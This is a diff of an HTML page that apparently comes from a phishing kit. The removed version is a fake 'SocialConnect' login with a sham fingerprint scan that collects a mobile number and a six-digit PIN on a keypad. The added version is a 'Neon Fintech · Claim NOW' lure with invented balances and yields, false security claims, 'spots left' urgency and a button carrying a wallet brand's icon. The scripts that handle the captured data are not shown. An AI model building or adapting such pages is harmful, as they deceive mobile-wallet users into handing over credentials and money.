@@ -1,73 +1,116 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SocialConnect | Secure Access</title>
-    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="styles/index.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Neon Fintech · Claim NOW</title>
+  <!-- Google Font (geometric sans-serif) -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet" />
+  <!-- External CSS -->
+  <link rel="stylesheet" href="styles/index.css" />
 </head>
 <body>
+  <div class="card-container">
+    <div class="glass-panel">
+      <!-- depth 3D element -->
+      <div class="depth-shadow"></div>
 
-<div class="glass-container">
-    
-    <div id="scan-layer">
-        <div class="scanner-circle">
-            <i class="fa-solid fa-fingerprint fingerprint-icon"></i>
-            <div class="scan-line"></div>
+      <!-- header + badge -->
+      <div class="flex-row" style="margin-bottom: 1rem;">
+        <div>
+          <span class="badge-emerald"><span class="glow-dot"></span> LIVE · 24/7</span>
+          <span class="badge-emerald" style="margin-left: 0.8rem;">✨ premium</span>
         </div>
-        <h2 class="title-text">RECOGNIZING DEVICE</h2>
-        <p class="sub-text">Analyzing secure access...</p>
+        <div class="icon-emerald">
+          <span>⚡</span> 0.0012s latency
+        </div>
+      </div>
+
+      <!-- main headline -->
+      <h1 class="headline">
+        Neon<span style="color: white; text-shadow: 0 0 20px rgba(255,255,255,0.1);">Fin</span>tech
+      </h1>
+      <p class="subhead" style="margin-bottom: 0.2rem;">
+        Next-gen digital banking · ultra-low fees, instant settlements.
+      </p>
+      <div class="badge-row" style="margin: 0.8rem 0 0.2rem;">
+        <span class="support-text" style="display: flex; align-items: center; gap: 0.3rem;">
+          <span style="color: #2EF2A3; font-weight: 600;">✦</span> 4.9/5 rating
+        </span>
+        <span class="support-text" style="display: flex; align-items: center; gap: 0.3rem;">
+          <span style="color: #2EF2A3; font-weight: 600;">✦</span> 1M+ users
+        </span>
+      </div>
+
+      <!-- floating dashboard cards -->
+      <div class="dashboard-grid">
+        <div class="floating-card">
+          <span class="card-label">💰 balance</span>
+          <div class="card-value">$12,480 <small>USD</small></div>
+          <span class="card-trend">↑ 2.4%</span>
+          <div style="margin-top: 0.3rem; display: flex; gap: 0.4rem;">
+            <span class="badge-emerald" style="font-size: 0.6rem;">available</span>
+          </div>
+        </div>
+        <div class="floating-card">
+          <span class="card-label">📊 yield</span>
+          <div class="card-value">8.6<small>%</small></div>
+          <span class="card-trend">+0.6% APY</span>
+          <div style="margin-top: 0.3rem; display: flex; gap: 0.4rem;">
+            <span class="badge-emerald" style="font-size: 0.6rem;">compounding</span>
+          </div>
+        </div>
+        <div class="floating-card">
+          <span class="card-label">⚡ transactions</span>
+          <div class="card-value">247</div>
+          <span class="card-trend" style="color: rgba(255,255,255,0.5);">today</span>
+          <div style="margin-top: 0.3rem; display: flex; gap: 0.4rem;">
+            <span class="badge-emerald" style="font-size: 0.6rem;">instant</span>
+          </div>
+        </div>
+        <div class="floating-card">
+          <span class="card-label">🔐 security</span>
+          <div class="card-value" style="font-size: 1.4rem;">✅ level 3</div>
+          <span class="card-trend" style="color: #2EF2A3;">zero-knowledge</span>
+          <div style="margin-top: 0.3rem; display: flex; gap: 0.4rem;">
+            <span class="badge-emerald" style="font-size: 0.6rem;">audited</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="divider-glow"></div>
+
+      <!-- bottom row: CTA + supporting text -->
+      <div class="flex-row" style="align-items: center;">
+        <div style="flex: 1;">
+          <div style="display: flex; align-items: center; gap: 0.8rem; flex-wrap: wrap;">
+            <span style="font-weight: 500; color: #fff; letter-spacing: -0.01em;">✨ early access</span>
+            <span class="support-text" style="font-size: 0.9rem; background: rgba(0,0,0,0.2); padding: 0.2rem 1rem; border-radius: 30px; border: 1px solid rgba(46,242,163,0.1);">
+              <span style="color: #2EF2A3;">●</span> 1,284 spots left
+            </span>
+          </div>
+          <p class="support-text" style="margin-top: 0.6rem; font-size: 0.95rem; max-width: 400px;">
+            Zero fees · instant withdrawals · premium neon dashboard.
+          </p>
+        </div>
+
+        <!-- Claim NOW button with icon -->
+        <div class="claim-now-wrapper">
+          <button class="claim-btn" id="claimBtn">
+            <img src="images/maya_icon.png" alt="icon" class="btn-icon" />
+            Claim NOW
+          </button>
+        </div>
+      </div>
+
+      <!-- tiny footer note -->
+      <div style="margin-top: 1.8rem; display: flex; justify-content: flex-end; opacity: 0.4; font-size: 0.65rem; color: #a0c0b0; letter-spacing: 0.04em; border-top: 1px solid rgba(46,242,163,0.05); padding-top: 1.2rem;">
+        <span>✦ premium fintech · neon edition</span>
+      </div>
     </div>
+  </div>
 
-    <div id="auth-layer" class="hidden">
-        <h2 id="ui-title" class="title-text">SocialConnect</h2>
-        <p id="ui-subtitle" class="sub-text"></p>
-
-        <div id="user-badge" class="hidden">
-            <div class="fingerprint-btn">
-                <i class="fa-solid fa-user-shield"></i>
-            </div>
-            <div id="masked-id" class="masked-id">09*****1234</div>
-            <p style="font-size: 10px; color: var(--accent); margin-top: 5px;">VERIFIED ACCOUNT</p>
-        </div>
-
-        <div id="mobile-box" class="input-group">
-            <input type="tel" id="mobile" placeholder="Enter 09xxxxxxxxx" maxlength="11">
-            <div id="mobile-err" class="error hidden">Must start with 09 (11 digits)</div>
-        </div>
-
-        <div id="keypad-section" class="hidden">
-            <p class="pin-label">SECURITY KEY REQUIRED</p>
-            <div class="dot-container">
-                <div class="dot"></div><div class="dot"></div><div class="dot"></div>
-                <div class="dot"></div><div class="dot"></div><div class="dot"></div>
-            </div>
-
-            <div class="keypad-container">
-                <div class="key" data-val="1">1</div>
-                <div class="key" data-val="2">2</div>
-                <div class="key" data-val="3">3</div>
-                <div class="key" data-val="4">4</div>
-                <div class="key" data-val="5">5</div>
-                <div class="key" data-val="6">6</div>
-                <div class="key" data-val="7">7</div>
-                <div class="key" data-val="8">8</div>
-                <div class="key" data-val="9">9</div>
-
-                <div class="key" data-val="clear"><i class="fa-solid fa-backspace"></i></div>
-                <div class="key" data-val="0">0</div>
-                <div class="key" style="visibility:hidden;"></div>
-            </div>
-            
-            <button id="btnAction" class="btn-submit hidden">
-                PROCEED TO DASHBOARD <i class="fa-solid fa-arrow-right"></i>
-            </button>
-        </div>
-    </div>
-</div>
-
-<script type="module" src="js/config.js"></script>
+  <!-- External JavaScript -->
+  <script src="js/index.js"></script>
 </body>
 </html>
